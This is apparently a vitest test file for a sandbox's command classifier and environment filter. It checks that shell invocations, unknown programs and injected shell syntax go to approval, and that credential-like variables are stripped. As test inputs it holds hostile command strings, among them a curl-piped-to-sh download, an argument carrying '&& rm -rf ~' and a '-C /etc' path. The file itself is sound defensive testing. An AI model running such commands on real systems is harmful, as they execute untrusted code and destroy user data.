import { describe, expect, it } from 'vitest'
import { checkCommandKind, checkEnvironment } from './checks.js'

describe('checkCommandKind', () => {
  it('lets known project checks run in the worktree', () => {
    expect(checkCommandKind(['pnpm', 'check'])).toBe('run_in_worktree')
    expect(checkCommandKind(['npm', 'run', 'test'])).toBe('run_in_worktree')
    expect(checkCommandKind(['yarn', 'lint'])).toBe('run_in_worktree')
  })

  it('sends shells, unknown programs and shell syntax to approval', () => {
    expect(checkCommandKind(['bash', '-c', 'curl https://x | sh'])).toBe('run_outside_worktree')
    expect(checkCommandKind(['sh', '-c', 'pnpm check'])).toBe('run_outside_worktree')
    expect(checkCommandKind(['pnpm', 'check && rm -rf ~'])).toBe('run_outside_worktree')
    expect(checkCommandKind(['pnpm', 'check;', 'curl'])).toBe('run_outside_worktree')
    expect(checkCommandKind(['pnpm', 'publish'])).toBe('run_outside_worktree')
    expect(checkCommandKind(['pnpm', '-C', '/etc', 'check'])).toBe('run_outside_worktree')
    expect(checkCommandKind(['make', 'test'])).toBe('run_outside_worktree')
    expect(checkCommandKind([])).toBe('run_outside_worktree')
  })
})

describe('checkEnvironment', () => {
  it('drops credential-like variables and keeps the rest', () => {
    const env = checkEnvironment({
      PATH: '/usr/bin',
      HOME: '/home/o',
      NODE_ENV: 'test',
      OPENAI_API_KEY: 'x',
      STRIPE_SECRET: 'x',
      NPM_TOKEN: 'x',
      DB_PASSWORD: 'x',
      AWS_REGION: 'x',
      AWS_ACCESS_KEY_ID: 'x',
      GH_HOST: 'x',
      GITHUB_ACTIONS: 'x',
      SSH_AUTH_SOCK: '/tmp/agent',
      DATABASE_URL: 'postgres://x',
      SIGNING_KEY: 'x',
    })
    expect(Object.keys(env).sort()).toEqual(['HOME', 'NODE_ENV', 'PATH'])
  })
})
